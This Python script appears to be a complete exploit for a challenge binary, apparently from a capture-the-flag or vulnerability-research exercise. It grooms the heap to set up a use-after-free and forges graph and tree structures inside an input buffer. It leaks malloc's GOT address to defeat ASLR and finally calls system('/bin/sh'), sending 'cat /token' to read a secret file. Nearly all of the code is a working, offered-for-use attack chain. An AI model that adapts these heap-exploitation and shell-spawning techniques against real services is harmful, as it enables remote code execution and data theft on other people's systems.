import base64
import comms
import copy
from elftools.elf.elffile import ELFFile, SymbolTableSection, RelocationSection
import re
import struct
import sys
import time

# As long as this exploit runs with the same base docker image as the exploit,
# this will work fine
LIBC_FILENAME = "/lib/x86_64-linux-gnu/libc-2.27.so"

cyclic_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

patterns_and_keys = [
    ("A" * 0x800, '0x4141414141414141'),
    ("B" * 0x800, '0x4242424242424242'),
    ("C" * 0x800, '0x4343434343434343'),
    ("D" * 0x800, '0x4444444444444444'),
    ("E" * 0x800, '0x4545454545454545'),
    ("F" * 0x800, '0x4646464646464646'),
    ("G" * 0x800, '0x4747474747474747')
]

def make_cyclic(length, alphabet=cyclic_alphabet):
    c = ''
    l = len(alphabet)
    for i in range(int(length / 4)):
        c += alphabet[i % len(alphabet)]
        c += alphabet[int(i/l) % len(alphabet)]
        c += alphabet[int(i/l/l) % len(alphabet)]
        c += alphabet[int(i/l/l/l) % len(alphabet)]
    return bytes(c, 'utf8')

def find_cyclic_offset(pattern, length, alphabet=cyclic_alphabet):
    c = make_cyclic(length, alphabet)
    return c.index(pattern)


def escape_encode_string(s):
    if type(s) == str:
        s = bytes(s, 'utf8')
    result = b""
    for c in s:
        if c >= ord('A') and c <= ord('Z'):
            result += bytes([c])
        elif c >= ord('a') and c <= ord('z'):
            result += bytes([c])
        elif c >= ord('0') and c <= ord('9'):
            result += bytes([c])
        else:
            result += bytes("\\x{:02x}".format(c), 'utf8')
    return result


class BufBuilder:
    def __init__(self, address):
        self._address = address
        self._bytes = b""

    @property
    def address(self):
        return self._address

    @property
    def bytes(self):
        return self._bytes

    def append(self, byts):
        self._bytes += byts
        self._address += len(byts)

    def make_vertex(
        self,
        object,
        node_id,
        properties,
        successors=0,
        predecessors=0,
        size_of_successors=0,
        num_successors=0,
        size_of_predecessors=0,
        num_predecessors=0
    ):
        vertex = \
            struct.pack(
                "<QQQQQHHHH",
                object,
                node_id,
                properties,
                successors,
                predecessors,
                size_of_successors,
                num_successors,
                size_of_predecessors,
                num_predecessors
            )
        print("vertex", base64.b16encode(vertex))
        self.append(vertex)

    def make_aa_node(self, aa_node_object, object, level, left, right):
        aa_node = \
            struct.pack("<QQQQQ", aa_node_object, object, level, left, right)
        print("aa_node", base64.b16encode(aa_node))
        self.append(aa_node)

    def make_aa_tree(self, object, type, root):
        aa_tree = struct.pack("<QQQ", object, type, root)
        print("aa_tree", base64.b16encode(aa_tree))
        self.append(aa_tree)

    def make_vertex_property(self, object, key, key_length, value, value_length):
        vertex_property = struct.pack("<QQQQQ", object, key, key_length, value, value_length)
        print("vertex_property", base64.b16encode(vertex_property))
        self.append(vertex_property)

    def check(self):
        bad_chars = [b';', b'\n']
        for bad_char in bad_chars:
            if bad_char in self.bytes:
                index = self.bytes.index(bad_char)
                print("ERROR bad char in buf_builder bytes")
                print("All bytes:", base64.b16encode(self.bytes))
                print("Bytes around bad char:", base64.b16encode(self.bytes[index:index+16]))
                print("Index: {}".format(index))
                print("Try adjusting padding bytes")
                sys.exit(0)

class ElfParse:
    def __init__(self, filename):
        self._filename = filename
        self._elf = ELFFile(open(filename, 'rb'))

    @property
    def elf(self):
        return self._elf

    def get_symbol(self, symbol_name):
        symbol_tables = [
            s for s in self.elf.iter_sections()
            if isinstance(s, SymbolTableSection)
        ]
        for symbol_table in symbol_tables:
            for symbol in symbol_table.iter_symbols():
                if symbol.name == symbol_name:
                    return symbol["st_value"]

    def get_relocation(self, relocation_name):
        relocation_tables = [
            r for r in self.elf.iter_sections()
            if isinstance(r, RelocationSection)
        ]
        for relocation_table in relocation_tables:
            symbol_table = self.elf.get_section(relocation_table["sh_link"])
            for relocation in relocation_table.iter_relocations():
                symbol = symbol_table.get_symbol(relocation["r_info_sym"])
                if symbol.name == relocation_name:
                    return relocation["r_offset"]


class Sploit:
    def __init__(self, filename, host, port):
        self._elf_parse = ElfParse(filename)
        self._comms = comms.Comms(host, port)

        self._comms.recv_until(">")
        self._comms.sendall("2\n")
        time.sleep(0.1)

    def get_symbol(self, symbol_name):
        return self._elf_parse.get_symbol(symbol_name)

    def get_relocation(self, relocation_name):
        return self._elf_parse.get_relocation(relocation_name)

    @property
    def comms(self):
        return self._comms

    def add(self, n):
        self._comms.sendall("add({});".format(n))

    def get(self, n):
        self._comms.sendall("get({});".format(n))

    def remove(self, n):
        self._comms.sendall("remove({});".format(n))

    def set_property(self, node, key, value):
        self._comms.sendall(
            b"set_property(get(" + \
            bytes(str(node), 'utf8') + \
            b"), \"" + \
            escape_encode_string(key) + \
            b"\", \"" + \
            escape_encode_string(value) + \
            b"\");"
        )

    def remove_property(self, node, key):
        self._comms.sendall(
            "remove_property(get({}), \"{}\");".format(
                node,
                escape_encode_string(key)
            )
        )

    def add_successors(self, node, successor):
        self._comms.sendall(
            "add_successors(get({}), get({}));".format(node, successor))

    def get_successors(self, n):
        self._comms.sendall("get_successors(get({}));".format(n))

    def exit(self):
        self._comms.sendall("exit;")

    def test(self):
        self.add(1)
        self.get(1)
        self.exit()
        print(self._comms.recvall())

    def sploit(self, system_addr):
        '''
This is what we are creating

fake_object -> {
    0xdeadbeef,
    0xdeadbeef,
    system()
}


{
    /* vertex_a (the vertex we are overflowing with) */
    object -> object_type_vertex,
    node_id = irrelevant,
    properties -> {
        /*_aa_tree */
        object -> aa_tree_object,
        type -> vertex_property_object,
        root -> {
            /* aa_node_a */
            object -> aa_node_object,
            level = 0,
            object -> {
                /* vertex_property_a */
                object -> fake_object,
                key = "sentinel\0",
                key_length = 9,
                value = 0,
                value_length = 0
            }
            left -> NULL,
            right -> {
                /* aa_node_b */
                object -> aa_node_object,
                level = 0,
                object -> {
                    /* vertex_property_b */
                    object = "/bin/sh\0",
                    key = "sentine1\0",
                    key_length = 9,
                    value = 0,
                    value_length = 0
                },
                left -> {
                    /* aa_node_c */
                    object -> aa_node_object,
                    level = 0,
                    object -> {
                        /* vertex_property_c */
                        object -> vertex_property_object,
                        key = "sentine2\0",
                        key_length = 9,
                        value = 0,
                        value_length = 0
                    },
                    left -> NULL,
                    right -> NULL
                }
                right -> NULL
            }
        }
    },
    successors -> irrelevant,
    predecessors -> irrelevant,
    size_of_successors = 0,
    num_successors = 0,
    size_of_predecessors = 0,
    num_predecessors = 0
}
        '''

        padding_bytes = 0x1fe
        buf_builder = BufBuilder(self.get_symbol("input_buf") + padding_bytes)
        fake_object_address = buf_builder.address
        buf_builder.append(
            struct.pack("<QQQ", 0xdeadbeef, 0xdeadbeef, system_addr)
        )

        binsh_address = buf_builder.address
        buf_builder.append(b"/bin/sh\x00")
        sentine1_address = buf_builder.address
        buf_builder.append(b"sentine1\x00")
        sentinel_address = buf_builder.address
        buf_builder.append(b"sentinel\x00")
        sentine2_address = buf_builder.address
        buf_builder.append(b"sentine2\x00")

        vertex_property_c_address = buf_builder.address
        buf_builder.make_vertex_property(
            self.get_symbol("vertex_property_object"),
            sentine2_address,
            9,
            0,
            0
        )

        aa_node_c_address = buf_builder.address
        buf_builder.make_aa_node(
            self.get_symbol("aa_node_object"),
            0,
            vertex_property_c_address,
            0,
            0
        )

        vertex_property_b_address = buf_builder.address
        buf_builder.make_vertex_property(
            0x68732f6e69622f, # this is /bin/sh
            sentine1_address,
            9,
            0,
            0
        )

        aa_node_b_address = buf_builder.address
        buf_builder.make_aa_node(
            self.get_symbol("aa_node_object"),
            0,
            vertex_property_b_address,
            aa_node_c_address,
            0
        )

        vertex_property_a_address = buf_builder.address
        buf_builder.make_vertex_property(
            fake_object_address,
            sentinel_address,
            9,
            0,
            0
        )

        aa_node_a_address = buf_builder.address
        buf_builder.make_aa_node(
            fake_object_address,
            0,
            vertex_property_a_address,
            0,
            aa_node_b_address
        )

        aa_tree_address = buf_builder.address
        buf_builder.make_aa_tree(
            self.get_symbol("aa_tree_object"),
            self.get_symbol("vertex_property_object"),
            aa_node_a_address
        )

        print(hex(aa_tree_address))
        vertex = struct.pack("<QQQQQHHHH",
            self.get_symbol("vertex_o"), # object
            0x1337, # node_id
            aa_tree_address, # properties
            0xdeadbeef0, # successors
            0xdeadbeef1, # predecessors
            0xdea1, # size_of_successors
            0xdea2, # num_successors
            0xdea2, # size_of_predecessors
            0xdea3  # num_predecessors
        )

        print("aa_tree_address  ", hex(aa_tree_address))
        print("aa_node_a_address", hex(aa_node_a_address))
        print("aa_node_b_address", hex(aa_node_b_address))
        print("aa_node_c_address", hex(aa_node_c_address))
        print("vertex_property_a", hex(vertex_property_a_address))
        print("vertex_property_b", hex(vertex_property_b_address))
        print("vertex_property_c", hex(vertex_property_c_address))
        print("sentinel_address ", hex(sentinel_address))
        print("sentine1_address ", hex(sentine1_address))
        print("sentine2_address ", hex(sentine2_address))
        print("binsh_address    ", hex(binsh_address))

        print("vertex", base64.b16encode(vertex))

        offset = 112
        text = (b"a" * offset) + \
               vertex + \
               make_cyclic(0x800 - offset - len(vertex))

        print("escaped vertex", escape_encode_string(vertex))

        self.set_property(1, "A", "A" * 0x800)
        self.set_property(1, "B", "B" * 0x800)
        # self.set_property(1, "C", "C" * 0x800)
        self.set_property(1, "C", text)
        self.set_property(1, "D", "D" * 0x800)
        self.set_property(1, "E", "E" * 0x800)
        self.set_property(1, "F", "F" * 0x800)
        self.set_property(1, "G", "G" * 0x800)

        buf_builder.check()
        print("buf_builder looks clean")

        # Let's get our fake structure in place
        self.comms.sendall(b"#" + b"A" * (padding_bytes - 1) + buf_builder.bytes + b"\nget(1);")

        print("trigger")
        # Trigger exploit
        self.comms.sendall("remove_property(get_successors(get(1)), \"sentinel\");")

        self.comms.sendall("ls -lh\n")
        self.comms.sendall("echo -n TOKEN\= && cat /token\n")
        self.comms.sendall("echo doneDONE\n")
        while True:
            line = self.comms.recvline()
            #print(line)
            if b"TOKEN=" in line:
                print(str(line, errors='ignore'))

            if b"doneDONE" in line:
                break



    def leak(self, leak_address, debug=False):
        buf_builder = BufBuilder(self.get_symbol("input_buf") + 0x200)

        dummy_key = b"leak\x00\x00\x00\x00"

        dummy_key_address = buf_builder.address
        buf_builder.append(dummy_key)

        print("Leaking {:x}".format(leak_address))

        vertex_property_address = buf_builder.address
        buf_builder.make_vertex_property(
            self.get_symbol("object_type_vertex_property"),
            dummy_key_address,
            5,
            leak_address,
            0
        )

        aa_node_address = buf_builder.address
        buf_builder.make_aa_node(
            self.get_symbol("object_type_aa_node"),
            0,
            vertex_property_address,
            0,
            0
        )

        aa_tree_address = buf_builder.address
        buf_builder.make_aa_tree(
            self.get_symbol("object_type_aa_tree"),
            self.get_symbol("object_type_vertex_property"),
            aa_node_address
        )

        print("dummy_key_address: 0x{:x}".format(dummy_key_address))
        print("vertex_property_address: 0x{:x}".format(vertex_property_address))
        print("aa_node_address: 0x{:x}".format(aa_node_address))
        print("aa_tree_address: 0x{:x}".format(aa_tree_address))

        # Check our fake_structure_bytes to make sure they don't contain
        # ';' or '\n'
        buf_builder.check()
        print("buf_builder looks clean")

        vertex = struct.pack("<QQQQQHHHH",
            self.get_symbol("vertex_o"), # object
            0x1337, # node_id
            aa_tree_address, # properties
            0xdeadbeef0, # successors
            0xdeadbeef1, # predecessors
            0xdea1, # size_of_successors
            0xdea2, # num_successors
            0xdea2, # size_of_predecessors
            0xdea3  # num_predecessors
        )
        print("Size of vertex (should be 0x30): 0x{:x}".format(len(vertex)))

        offset = 112
        text = (b"a" * offset) + \
               vertex + \
               make_cyclic(0x800 - offset - len(vertex))

        self.set_property(1, "A", "A" * 0x800)
        self.set_property(1, "B", "B" * 0x800)
        # self.set_property(1, "C", "C" * 0x800)
        self.set_property(1, "C", text)
        self.set_property(1, "D", "D" * 0x800)
        self.set_property(1, "E", "E" * 0x800)
        self.set_property(1, "F", "F" * 0x800)
        self.set_property(1, "G", "G" * 0x800)

        # Let's get our fake structure in place
        self.comms.sendall(b"#" + b"A" * 0x1ff + buf_builder.bytes+ b"\nget(1);")

        # Now get that vertex
        self.comms.sendall("get_successors(get(1));")

        if debug:
            print(self.comms.recvall())

        text = self.comms.recvline()
        i = 0
        while b"[leak" not in text:
            text = self.comms.recvline()
            print(text)
            i += 1
            if i > 100:
                break

        self.exit()

        regex = re.compile(b"\\[leak=(.*?)\\]\n")
        matches = regex.findall(text)
        qword = matches[0]
        while len(qword) < 8:
            qword += bytes([0])
        return struct.unpack("<Q", qword)[0]


    def spray(self, patterns, successor_node=1):
        for i in range(len(patterns)):
            self.set_property(1, "x{}".format(i), patterns[i])
        self.comms.sendall("get_successors(get({}));".format(successor_node))
        self.comms.sendall("exit;")
        return self.comms.recvall()


    def prep1(self, dummy_nodes=38):
        '''
            This gets our pointer to a freed struct vertex prepped and ready to
            go
        '''
        # Create node 1
        self.add(1)
        # Create a bunch of properties with values the same size as a struct
        # vertex
        for i in range(dummy_nodes):
            self.add(i + 1000)
        # Create the second node
        self.add(2)
        for i in range(dummy_nodes):
            self.remove(i + 1000)
        # Create two successors
        self.add_successors(1, 2)
        self.add_successors(1, 2)
        # Delete node 2. Node 1 will still have a successor pointer to this
        # freed vertex
        self.remove(2)


    def prep2(self, dummy_nodes=200):
        '''
            This gets our pointer to a freed struct vertex prepped and ready to
            go
        '''
        # Create valid nodes
        self.add(1)
        self.add(2)
        # Create a bunch of properties with values the same size as a struct
        # vertex
        for i in range(dummy_nodes):
            self.add(i + 1000)
        # Create the second node
        self.add(3)
        self.add(4)
        self.add_successors(1, 3)
        self.add_successors(1, 3)
        self.add_successors(2, 4)
        self.add_successors(2, 4)
        self.remove(3)
        self.remove(4)
        for i in range(dummy_nodes):
            self.remove(i + 1000)



def find_overflow(filename, host, port, successor_node=1, prep=1):
    regex = re.compile("\\[OBJECT TYPE MISMATCH\\] .*? \\(.*? (.*?)\\)")

    just_patterns = list(map(lambda x: x[0], patterns_and_keys))
    just_keys = list(map(lambda x: x[1], patterns_and_keys))

    for dummy_nodes in range(500):
        sploit = Sploit(filename, host, port)
        if prep == 1:
            sploit.prep1(dummy_nodes=dummy_nodes)
        else:
            sploit.prep2(dummy_nodes=dummy_nodes)
        s = str(sploit.spray(just_patterns, successor_node), 'utf8')
        matches = regex.findall(s)
        if len(matches) > 0:
            match = matches[0]
            # print(i, match)
            for k in range(len(just_keys)):
                if just_keys[k] not in match:
                    continue
                new_patterns = copy.deepcopy(just_patterns)
                new_patterns[k] = make_cyclic(0x800)

                sploit = Sploit(filename, host, port)
                if prep == 1:
                    sploit.prep1(dummy_nodes=dummy_nodes)
                else:
                    sploit.prep2(dummy_nodes=dummy_nodes)
                s = str(sploit.spray(new_patterns, successor_node), 'utf8')
                matches = regex.findall(s)
                pattern = matches[0][2:]
                chars = base64.b16decode(pattern.upper())
                swapped = b""
                for i in range(len(chars)):
                    swapped += bytes([chars[7 - i]])
                offset = find_cyclic_offset(swapped, 0x800)
                print(
                    "FOUND pattern dummy_nodes={} pattern={} ({}) at offset {}".format(
                        dummy_nodes, k, just_keys[k], offset))




if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: {} <binary_we_are_exploiting> <host> <port>".format(sys.argv[0]))
        print("Try: {} /variants/unpatched/xenia.bin challenge 3008".format(sys.argv[0]))
        sys.exit(-1)

    filename = sys.argv[1]
    host = sys.argv[2]
    port = int(sys.argv[3])

    print("filename", filename)
    print("host", host)
    print("port", port)

    libc = ElfParse(LIBC_FILENAME)

    malloc_addr = libc.get_symbol("malloc")
    system_addr = libc.get_symbol("system")

    print("malloc_addr: 0x{:x}".format(malloc_addr))
    print("system_addr: 0x{:x}".format(system_addr))

    # If for some reason heap layout changes, use this to brute force another
    # location where we have a stable UAF pattern
    # find_overflow(filename, host, port, successor_node=1, prep=1)
    # sys.exit(0)

    sploit = Sploit(filename, host, port)
    sploit.prep1(dummy_nodes=38)

    print("malloc relocation: ", hex(sploit.get_relocation("malloc")))
    print("malloc symbol:", hex(sploit.get_symbol("malloc")))

    malloc_got = sploit.get_relocation("malloc")

    malloc_runtime_addr = sploit.leak(malloc_got)

    print("malloc:", hex(malloc_runtime_addr))
    system_addr = malloc_runtime_addr - malloc_addr + system_addr
    print("system:", hex(system_addr))

    sploit = Sploit(filename, host, port)
    sploit.prep1(dummy_nodes=38)
    sploit.sploit(system_addr)
